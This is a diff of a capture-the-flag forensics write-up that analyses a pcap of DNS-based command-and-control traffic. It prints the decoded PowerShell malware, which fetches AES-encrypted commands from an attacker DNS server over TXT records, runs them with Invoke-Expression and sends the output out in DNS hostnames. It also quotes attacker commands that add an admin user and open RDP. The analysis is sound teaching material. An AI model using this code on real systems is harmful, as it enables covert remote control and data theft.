@@ -1,4 +1,4 @@
-This challenge is about extracting encoded information in a Wireshark pcap file,
+This challenge is about extracting encoded information in a Wireshark pcap network dump file,
 where the scenario is that a host on the network has been infected with a command/control malware and has been sending suspicious network traffic.
 We have been given a pcap which contains some of this type of malicious traffic.
 
@@ -46,7 +46,7 @@ Looking at the binary data of the image, it looks like base64, specifically beca
 ZnVuY3Rpb24gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QoJGtleSwgJElWKSB7CiAgICAkYWVzTWFuYWdlZCA9IE5ldy1PYmplY3QgIlN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzTWFuYWdlZCIKICAgICRhZXNNYW5hZ2VkLk1vZGUgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5DaXBoZXJNb2RlXTo6Q0JDCiAgICAkYWVzTWFuYWdlZC5QYWRkaW5nID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpaZXJvcwogICAgJGFlc01hbmFnZWQuQmxvY2tTaXplID0gMTI4CiAgICAkYWVzTWFuYWdlZC5LZXlTaXplID0gMjU2CiAgICBpZiAoJElWKSB7CiAgICAgICAgaWYgKCRJVi5nZXRUeXBlKCkuTmFtZSAtZXEgIlN0cmluZyIpIHsKICAgICAgICAgICAgJGFlc01hbmFnZWQuSVYgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRJVikKICAgICAKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRhZXNNYW5hZ2VkLklWID0gJElWCiAgICAgCgogICAgICAgIH0KICAgIH0KICAgIGlmICgka2V5KSB7CgogICAgICAgIGlmICgka2V5LmdldFR5cGUoKS5OYW1lIC1lcSAiU3RyaW5nIikgewogICAgICAgICAgICAkYWVzTWFuYWdlZC5LZXkgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRrZXkpCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkYWVzTWFuYWdlZC5LZXkgPSAka2V5CiAgICAgICAgfQogICAgfQogICAgJGFlc01hbmFnZWQKfQoKZnVuY3Rpb24gQ3JlYXRlLUFlc0tleSgpIHsKICAKICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleSAkSVYKICAgIFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRhZXNNYW5hZ2VkLktleSkKfQoKZnVuY3Rpb24gRW5jcnlwdC1TdHJpbmcoJGtleSwgJHVuZW5jcnlwdGVkU3RyaW5nKSB7CiAgICAkYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCR1bmVuY3J5cHRlZFN0cmluZykKICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleQogICAgJGVuY3J5cHRvciA9ICRhZXNNYW5hZ2VkLkNyZWF0ZUVuY3J5cHRvcigpCiAgICAkZW5jcnlwdGVkRGF0YSA9ICRlbmNyeXB0b3IuVHJhbnNmb3JtRmluYWxCbG9jaygkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpOwogICAgW2J5dGVbXV0gJGZ1bGxEYXRhID0gJGFlc01hbmFnZWQuSVYgKyAkZW5jcnlwdGVkRGF0YQogICAgJGFlc01hbmFnZWQuRGlzcG9zZSgpCiAgICBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRmdWxsRGF0YSkucmVwbGFjZSgiLSIsIiIpCn0KCmZ1bmN0aW9uIERlY3J5cHQtU3RyaW5nKCRrZXksICRlbmNyeXB0ZWRTdHJpbmdXaXRoSVYpIHsKICAgICRieXRlcyA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGVuY3J5cHRlZFN0cmluZ1dpdGhJVikKICAgICRJViA9ICRieXRlc1swLi4xNV0KICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleSAkSVYKICAgICRkZWNyeXB0b3IgPSAkYWVzTWFuYWdlZC5DcmVhdGVEZWNyeXB0b3IoKTsKICAgICR1bmVuY3J5cHRlZERhdGEgPSAkZGVjcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJGJ5dGVzLCAxNiwgJGJ5dGVzLkxlbmd0aCAtIDE2KTsKICAgICRhZXNNYW5hZ2VkLkRpc3Bvc2UoKQogICAgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJHVuZW5jcnlwdGVkRGF0YSkuVHJpbShbY2hhcl0wKQp9CgpmaWx0ZXIgcGFydHMoJHF1ZXJ5KSB7ICR0ID0gJF87IDAuLlttYXRoXTo6Zmxvb3IoJHQubGVuZ3RoIC8gJHF1ZXJ5KSB8ICUgeyAkdC5zdWJzdHJpbmcoJHF1ZXJ5ICogJF8sIFttYXRoXTo6bWluKCRxdWVyeSwgJHQubGVuZ3RoIC0gJHF1ZXJ5ICogJF8pKSB9fSAKJGtleSA9ICJhMUU0TVV0eWNXc3dUbXRyTUhkcWRnPT0iCiRvdXQgPSBSZXNvbHZlLURuc05hbWUgLXR5cGUgVFhUIC1EbnNPbmx5IHdpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODl8U2VsZWN0LU9iamVjdCAtUHJvcGVydHkgU3RyaW5nczsKZm9yICgkbnVtID0gMCA7ICRudW0gLWxlICRvdXQuTGVuZ3RoLTI7ICRudW0rKyl7CiRlbmNyeXB0ZWRTdHJpbmcgPSAkb3V0WyRudW1dLlN0cmluZ3NbMF0KJGJhY2tUb1BsYWluVGV4dCA9IERlY3J5cHQtU3RyaW5nICRrZXkgJGVuY3J5cHRlZFN0cmluZwokb3V0cHV0ID0gaWV4ICRiYWNrVG9QbGFpblRleHQ7JHByID0gRW5jcnlwdC1TdHJpbmcgJGtleSAkb3V0cHV0fHBhcnRzIDMyClJlc29sdmUtRG5zTmFtZSAtdHlwZSBBIC1EbnNPbmx5IHN0YXJ0LndpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKZm9yICgkYW5zID0gMDsgJGFucyAtbHQgJHByLmxlbmd0aC0xOyAkYW5zKyspewokZG9tYWluID0gLWpvaW4oJHByWyRhbnNdLCIud2luZG93c2xpdmV1cGRhdGVyLmNvbSIpClJlc29sdmUtRG5zTmFtZSAtdHlwZSBBIC1EbnNPbmx5ICRkb21haW4gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKICAgIH0KUmVzb2x2ZS1EbnNOYW1lIC10eXBlIEEgLURuc09ubHkgZW5kLndpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKfQ==
 ```
  
-Sure enough, decoding this as a base64 string yields the following powershell script.
+Sure enough, decoding this as a Base64 string yields the following powershell script.
 
 ```powershell
 function Create-AesManagedObject($key, $IV) {
@@ -119,11 +119,23 @@ Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
 Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
 }
 ```
-It appears the AES key used is a1E4MUtycWswTmtrMHdqdg== (kQ81Krqk0Nkk0wjv), which is exactly 16 characters - we're working with a 128 bit AES key, but the script itself seems to ask for a 256 bit key... Also, it appears that the first 16 bytes of each message is likely to be an initialization vector, as this can be gathered from the 'Decrypt-String' function. 
+It appears the AES key used is a1E4MUtycWswTmtrMHdqdg== (kQ81Krqk0Nkk0wjv), which is exactly 16 characters - we're working with a 128 bit AES key, but the script itself seems to ask for a 256 bit key... Also, it appears that the first 16 bytes of each message is likely to be an AES initialization vector, as this can be gathered from the 'Decrypt-String' function:
 
-Examining the pcap further, you can find excessive DNS queries with supicious domain names which almost look like encoded data exfiltration. In the beginning, there appears to be a large query containing several TXT records which appear to be answered in base64 encoding.
+```powershell
+$IV = $bytes[0..15]
+```
 
-Modifying the script to decrypt rather than execute, we get the following script and subsequent output.
+In addition to this, we can gather from the exctracted powershell code that commands appear to be sent via DNS TXT records which are then decrypted and executed with Invoke-Expression (iex), the output is then encrypted and split into parts which is then exfiltrated via DNS queries.
+```powershell
+$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;
+....
+$output = iex $backToPlainText
+$pr = Encrypt-String $key $output|parts 32
+```
+
+Examining the pcap further, you can find excessive DNS queries with supicious domain names which almost look like encoded data exfiltration. In the beginning, there appears to be a large query containing several TXT records which appear to be answered in Base64 encoding, which matches the observations made in the decoded PowerShell script.
+
+Modifying the script to decrypt rather than execute, I created the following script containing the Base64 encoded strings in the TXT records to be decrypted.
 
 ```powershell
 $key = "a1E4MUtycWswTmtrMHdqdg=="
@@ -140,6 +152,8 @@ for ($num = 0 ; $num -le $out.Length - 2; $num++) {
 }
 ```
 
+Output:
+
 ```cmd
 hostname
 whoami
@@ -149,7 +163,7 @@ net user DefaultUsr "JHBhcnQxPSdIVEJ7eTB1X2M0bl8n" /add /Y; net localgroup Admin
 netsh advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389
 ```
 
-Since we're just hunting base64 at this point... the created DefaultUsr string decodes from base64 into "$part1='HTB{y0u_c4n_'", which is the first part of the flag. The remainder can likely be found in the additional DNS queries where data exfiltration appear to be taking place in the hostnames.
+Since we're just hunting Base64 at this point... the created DefaultUsr string decodes from base64 into "$part1='HTB{y0u_c4n_'", which is the first part of the flag. The remainder can likely be found in the additional DNS queries where data exfiltration appear to be taking place in the hostnames.
 
 Reading the Encrypt-String function, it also appears that the output of it is converting from what is likely to be Base64 into hex, so let's convert this back and put the newly gathered base64 strings into the decryptor function. From there, it is just a matter of putting all the hexes into powershell (manually, eugh) and then converting, then decrypting.
 
